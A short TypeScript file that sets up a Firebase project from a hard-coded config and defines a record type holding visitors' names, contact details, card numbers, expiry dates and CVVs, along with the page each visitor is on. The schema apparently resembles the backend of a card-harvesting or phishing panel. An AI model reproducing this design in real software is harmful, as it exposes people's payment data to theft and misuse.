import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyC4LIAb47mCRchGaqOLPe6mNXMZqo2Zrzs",
  authDomain: "zainb-68cfa.firebaseapp.com",
  databaseURL: "https://zainb-68cfa-default-rtdb.firebaseio.com",
  projectId: "zainb-68cfa",
  storageBucket: "zainb-68cfa.firebasestorage.app",
  messagingSenderId: "753461913184",
  appId: "1:753461913184:web:90252cc2436aaf7dd2c505",
  measurementId: "G-FYSRX4YJW4"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
